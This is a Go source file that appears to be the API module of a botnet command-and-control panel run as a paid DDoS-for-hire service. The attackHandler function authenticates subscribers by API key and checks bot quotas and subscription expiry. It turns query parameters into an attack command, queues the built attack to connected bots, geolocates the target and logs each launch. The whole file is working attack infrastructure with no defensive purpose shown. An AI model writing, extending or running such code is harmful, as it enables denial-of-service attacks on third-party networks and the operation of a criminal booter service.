package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

func StartAPIServer(port string) {
	http.HandleFunc("/api/attack", attackHandler)
	fmt.Println("API server started on port", port)
	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		fmt.Println("Failed to start API server:", err)
	}
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	query := r.URL.Query()
	user := query.Get("user")
	apikey := query.Get("apikey")
	host := query.Get("host")
	timeStr := query.Get("time")
	method := query.Get("method")
	port := query.Get("port")

	if user == "" || apikey == "" || host == "" || timeStr == "" || method == "" {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Missing required parameters")
		sendErrorResponse(w, "Missing required parameters")
		return
	}

	valid, accountInfo, err := database.ValidateAPIKey(user, apikey)
	if err != nil {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Database error: "+err.Error())
		sendErrorResponse(w, "Database error: "+err.Error())
		return
	}
	if !valid {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Invalid credentials or account expired")
		sendErrorResponse(w, "Invalid credentials or account expired")
		return
	}

	if accountInfo.ban != 0 {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Account banned")
		sendErrorResponse(w, "Account banned")
		return
	}

	hasAccess, err := database.apiAccess(user)
	if err != nil {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Database error (api_access): "+err.Error())
		sendErrorResponse(w, "Database error (api_access): "+err.Error())
		return
	}
	if !hasAccess {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "API access denied")
		sendErrorResponse(w, "API access denied")
		return
	}

	if !strings.HasPrefix(method, ".") {
		method = "." + method
	}
	cmd := fmt.Sprintf("%s %s %s", method, host, timeStr)

	if port != "" {
		cmd += fmt.Sprintf(" dport=%s", port)
	}

	for key, values := range query {
		if key != "user" && key != "apikey" && key != "host" && key != "port" && key != "time" && key != "method" {
			if len(values) > 0 && values[0] != "" {
				cmd += fmt.Sprintf(" %s=%s", key, values[0])
			}
		}
	}

	if method == "stop" {
		if accountInfo.admin != 1 {
			logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Only admins can use the stop command")
			sendErrorResponse(w, "Only admins can use the stop command")
			return
		}
		atk, err := NewAttack(cmd, accountInfo.admin)
		if err != nil {
			logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Failed to parse attack: "+err.Error())
			sendErrorResponse(w, "Failed to parse attack: "+err.Error())
			return
		}
		buf, err := atk.Build()
		if err != nil {
			logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Failed to build attack: "+err.Error())
			sendErrorResponse(w, "Failed to build attack: "+err.Error())
			return
		}
		can, err := database.CanLaunchAttack(user, 0, cmd, 0, 0, 0)
		if !can {
			logAPIAttack(user, clientIP, method, host, port, 0, "fail", err.Error())
			sendErrorResponse(w, err.Error())
			return
		}
		clientList.QueueBuf(buf, 0, "")
		logAPIAttack(user, clientIP, method, host, port, 0, "success", "")
		sendSuccessResponse(w, "Stop command sent successfully")
		return
	}

	atk, err := NewAttack(cmd, accountInfo.admin)
	if err != nil {
		logAPIAttack(user, clientIP, method, host, port, 0, "fail", "Failed to parse attack: "+err.Error())
		sendErrorResponse(w, "Failed to parse attack: "+err.Error())
		return
	}

	canLaunch, err := database.CanLaunchAttack(user, atk.Duration, cmd, accountInfo.maxBots, 0, config.GobalSlot)
	if err != nil || !canLaunch {
		logAPIAttack(user, clientIP, method, host, port, atk.Duration, "fail", "Cannot launch attack: "+err.Error())
		sendErrorResponse(w, "Cannot launch attack: "+err.Error())
		return
	}

	if database.ContainsWhitelistedTargets(atk) {
		logAPIAttack(user, clientIP, method, host, port, atk.Duration, "fail", "Attack blocked: targets are whitelisted")
		sendErrorResponse(w, "Attack blocked: targets are whitelisted")
		return
	}

	buf, err := atk.Build()
	if err != nil {
		logAPIAttack(user, clientIP, method, host, port, atk.Duration, "fail", "Failed to build attack: "+err.Error())
		sendErrorResponse(w, "Failed to build attack: "+err.Error())
		return
	}

	clientList.QueueBuf(buf, accountInfo.maxBots, "")

	logAPIAttack(user, clientIP, method, host, port, atk.Duration, "success", "")

	var targetIP string
	for ipUint32 := range atk.Targets {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, ipUint32)
		targetIP = ip.String()
		break
	}

	ipInfo, err := getIPInfo(targetIP, config.IPInfoToken)
	if err != nil {
		ipInfo = &IPInfo{Country: "Unknown", Org: "Unknown", Region: "Unknown"}
	}

	response := map[string]interface{}{
		"status":  "success",
		"message": "Attack sent successfully",
		"details": map[string]interface{}{
			"method":  method,
			"target":  targetIP,
			"port":    port,
			"time":    atk.Duration,
			"country": ipInfo.Country,
			"org":     ipInfo.Org,
			"region":  ipInfo.Region,
			"date":    time.Now().Format("2006-01-02 15:04:05"),
			"sent_by": user,
		},
		"user_info": map[string]interface{}{
			"username":   accountInfo.username,
			"max_bots":   accountInfo.maxBots,
			"admin":      accountInfo.admin == 1,
			"last_paid":  time.Unix(int64(accountInfo.last_paid), 0).Format("2006-01-02 15:04:05"),
			"interval":   accountInfo.intvl,
			"expires_in": calculateExpiry(accountInfo.last_paid, accountInfo.intvl),
		},
	}

	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		sendErrorResponse(w, "Failed to marshal JSON: "+err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}

func sendErrorResponse(w http.ResponseWriter, message string) {
	response := map[string]string{
		"status":  "error",
		"message": message,
	}
	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusBadRequest)
	w.Write(jsonData)
}

func sendSuccessResponse(w http.ResponseWriter, message string) {
	response := map[string]string{
		"status":  "success",
		"message": message,
	}
	jsonData, err := json.MarshalIndent(response, "", "    ")
	if err != nil {
		http.Error(w, "Failed to marshal JSON", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(jsonData)
}

func logAPIAttack(user, ip, method, target, port string, duration uint32, result, reason string) {
	log.SetFlags(log.LstdFlags)
	logOutput, err := os.OpenFile("logs/attacks.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		fmt.Println("Error opening log file:", err)
		return
	}
	defer logOutput.Close()
	log.SetOutput(logOutput)

	currentTime := time.Now().Format("2006-01-02 15:04:05")
	log.Printf("[%s] Method: API | User: %s | IP: %s | Method: %s | Target: %s | Port: %s | Duration: %d | Result: %s | Reason: %s", currentTime, user, ip, method, target, port, duration, result, reason)
}